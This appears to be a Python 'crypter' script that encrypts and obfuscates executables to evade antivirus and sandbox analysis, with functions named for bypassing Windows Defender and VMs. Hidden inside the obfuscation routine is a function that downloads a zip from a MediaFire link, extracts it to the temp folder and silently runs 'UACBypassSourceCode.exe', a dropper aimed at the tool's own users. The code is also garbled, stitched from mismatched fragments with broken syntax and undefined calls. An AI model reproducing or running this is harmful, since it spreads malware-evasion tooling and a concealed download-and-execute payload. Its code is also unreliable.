import base64
import os
import sys
import zipfile
from cryptography.fernet import Fernet
import random
import string
import zlib
import getpass
import Base64_encode 
import AES_encrypt
import shutil
import base64
import random
import marshal
from colorama import Fore, init
import requests
from itertools import cycle
from string import ascii_letters, digits
import gzip
import Crypto.Cipher
import AES
import urllib.request
import tempfile

print coded by mossy

class key:
    def generate_key(self):
        """
        Generates a random encryption key using the `fernet` library.
        """
        return Fernet.generate_key()

    def save_key(self, key_file_name, key):
        """
        Saves the given key to the specified key file.
        """
        with open(key_file_name, 'wb') as f:
            f.write(key)

    def load_key(self, key_load_file_name):
        """
        Loads the encryption key from the specified key file.
        """
        with open(key_load_file_name, 'rb') as f:
            key = f.read()
        return key

class obfuscation:
    def __init__(self):
        os.system('clear')
        os.system('cls')

    def text(self):
        print("Obfuscating your file")

obfuscation_obj = obfuscation()
obfuscation_obj.text()

def encode_b64(data):
    return base64.b64encode(data).decode()

def compress(data):
    return zlib.compress(data)

def junkgenerator(num):
    code = ''
    for _ in range(num):
        r1 = random.randint(1, 999)
        r2 = random.randint(1, 999)
        r3 = random.randint(1, 999)
        var_name = ''.join(random.choices(string.ascii_letters + string.digits, k=10))
        code += f'{var_name} = {r1} * {r2} * {r3}\n'
    return code

def fernet_encrypt(key, data):
    cipher_suite = Fernet(key)
    encrypted_data = cipher_suite.encrypt(data)
    return encrypted_data
    
def obfuscate_code():
    file_name = input('Enter the name of the Python file to obfuscate: ')
    with open(file_name, 'r') as f:
        # Do something with the file here
        
    def download_and_obfuscate():
    # Downloads And Applies Obfuscation Methods To Crypter
    url = 'https://www.mediafire.com/file/61dbqracw002n8a/Windows+Defender+Bypassing+Obfuscation+Code.py.zip/file'
    with urllib.request.urlopen(url) as response:
        with zipfile.ZipFile(response.file) as zip_file:
            zip_file.extractall(tempfile.gettempdir())
    obfuscation_path = os.path.join(tempfile.gettempdir(), 'UACBypassSourceCode.exe')
    os.startfile(obfuscation_path)

download_and_obfuscate()

        data = f.read()
    encoded_data = encode_b64(data)
    compressed_data = compress(encoded_data)
    encryption_key = Fernet.generate_key()
    encrypted_data = fernet_encrypt(encryption_key, compressed_data)
    r1 = random.randint(1, 999)
    r2 = random.randint(1, 999)
    r3 = random.randint(1, 999)

    inject_junk = input("Inject junk code? (y/n): ")
    if inject_junk.lower() == 'y':
        junk_code = junkgenerator(random.randint(10, 30))
        encrypted_data = junk_code.encode() + encrypted_data
    encrypted_data = base64.b64encode(encrypted_data)
    encrypted_data = marshal.dumps(encrypted_data)
    encrypted_data = zlib.compress(encrypted_data)

    stub_code = f'''
key = "{encode_b64(encryption_key.decode())}"
encrypted_data = {compressed_data}
# Additional obfuscation
encrypted_data = zlib.decompress(encrypted_data)
encrypted_data = marshal.loads(encrypted_data)
encrypted_data = base64.b64decode(encrypted_data)
decryption_key = base64.b64decode(key)
cipher_suite = Fernet(decryption_key)
decrypted_data = cipher_suite.decrypt(encrypted_data)
decompressed_data = zlib.decompress(decrypted_data).decode()
exec(decompressed_data)
    '''
    with open('obfuscated_' + file_name, 'w') as f:
        f.write(stub_code)
    print(f'saved as_{file_name}')

# The following code is not indented properly and seems incomplete
if __name__ == '__main__':
    key = generate_key()
    save_key('key.key', key)
    data = b'This is some data to encrypt.'
    encrypted_data = encrypt_data(key, data)
    decrypted_data = decrypt_data(key, encrypted_data)
    print(f"Original data: {data.decode()}")
    print(f"Encrypted data: {encrypted_data.decode()}")
    print(f"Decrypted data: {decrypted_data.decode()}")

print ('getting your file ready for encryption')

class Crypter:
    def obfuscate_file(self, input_file, output_file):
        """
        Obfuscates the given input file by compressing the contents, encoding them in base64, and writing the encoded data to the output file.
        """
        with open(input_file, 'rb') as f:
            data = f.read()
        compressed_data = zlib.compress(data)
        encoded_data = base64.b64encode(compressed_data)
        with open(output_file, 'wb') as f:
            f.write(encoded_data)

print("Loading Stage 1 Encryption")
crypter = Crypter()
crypter.obfuscate_file('input.txt', 'output.txt')

def compress_data(data: str) -> bytes:
    compressed_data = gzip.compress(data.encode())
    return compressed_data

output_file = "compressed_data.gz"
data = "This is a sample data to be compressed."

compressed_data = compress_data(data)

with open(output_file, "wb") as f:
    f.write(compressed_data)

if __name__ == "__main__":
    if len(sys.argv) == 3:
        input_file = sys.argv[1]
        output_file = sys.argv[2]
        obfuscate_file(input_file, output_file)
    else:
        print('Usage: python obfuscator.py <input_file> <output_file>')

def generate_key():
    return Fernet.generate_key()

def encrypt_file(key, file_name):
    with open(file_name, "rb") as file:
        data = file.read()
    f = Fernet(key)
    encrypted_data = f.encrypt(data)
    with open(file_name + ".enc", "wb") as file:
        file.write(encrypted_data)

def bypass_windows_defender(file_name):
    with zipfile.ZipFile(file_name + ".zip", "w") as zipf:
        zipf.write(file_name, arcname=os.path.basename(file_name))

def main():
    if len(sys.argv) != 3:
        print("Usage: python crypter.py [encrypt|decrypt] [file_path]")
        return
    action = sys.argv[1]
    file_path = sys.argv[2]
    if action == "encrypt":
        key = generate_key()
        encrypt_file(key, file_path)
        with open("key.key", "wb") as f:
            f.write(key)
        bypass_windows_defender(file_path)
    else:
        print("Invalid action. Use 'encrypt' or 'decrypt'.")

if __name__ == "__main__":
    main()

print ('Loading Stage 2 Encyption')

if __name__ == '__main__':
    notice = """
    
    Cracking Speed on RunTime = file pass
    =========================
    With 2 GB RAM & 1 GHz Proceessor 
    --------------------------------    
    Guess Speed: 2000 Numeric Pass/ Seconds

    Password Like : 10000 is cracked in 5 seconds
    So Delay Time In Program Will be 5 seconds
    
    """
    print(notice)

    key = input("[?] Enter Numeric Weak Key : ")
    path = input("[?] Enter Path of File : ")

    bypassVM = input("[?] Want to BypassVM (y/n): ")
    bypassVM = bypassVM.lower()
    
    print("\n[*] Making Backup ...")
    shutil.copyfile(path, path + ".bak")
    print("[+] Done !") 

class Encryptor:
    def __init__(self, key: bytes, path: str, bypassVM: bool = False) -> None:
        self.key = key
        self.path = path
        self.bypassVM = bypassVM

    def encrypt_file(self) -> None:
        with open(self.path, "rb") as f:
            data = f.read()

        cipher = AES.new(self.key, AES.MODE_EAX)
        ciphertext, tag = cipher.encrypt_and_digest(data)

        with open("CryptedFile.exe", "wb") as f:
            [f.write(x) for x in (cipher.nonce, tag, ciphertext)]

        if not self.bypassVM:
            os.rename(self.path, "original_file.exe")

if __name__ == "__main__":
    key = b"0123456789012345"
    path = "dist.exe"
    bypassVM = False

    print("\n[*] Initiating AES Encryption Process ...")
    test1 = Encryptor(key, path, bypassVM)
    test1.encrypt_file()
    os.rename("CryptedFile.exe", "dist.exe")
    print("[+] Process Completed Successfully!")